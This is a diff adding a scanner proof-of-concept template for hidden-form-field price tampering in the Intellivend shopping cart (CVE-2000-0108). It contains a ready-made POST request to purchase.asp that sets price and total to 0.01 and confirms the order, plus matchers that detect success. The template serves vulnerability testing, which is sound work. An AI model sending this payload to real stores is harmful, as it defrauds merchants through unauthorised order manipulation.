@@ -1,0 +1,44 @@
+[info]
+author = "ave"
+description = "通过修改 HTTP 请求中隐藏表单字段（如 price、total、quantity 等），绕过客户端限制篡改交易数据。攻击者无需认证即可修改商品价格、订单金额等敏感信息，导致未授权数据篡改与商业欺诈。"
+id = "POC-AVE-2000-0093"
+name = "Intellivend 购物车隐藏表单字段篡改 PoC"
+severity = "high"
+tags = ["ave-2000-0093"]
+vuln_id = [
+    "CVE-2000-0108",
+    "AVE-2000-0093",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/purchase.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = "item_id=1001&price=0.01&quantity=1&total=0.01&hidden_action=confirm"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order_confirmed",
+    "Order Complete",
+    "thank_you",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+]
+type = "status"
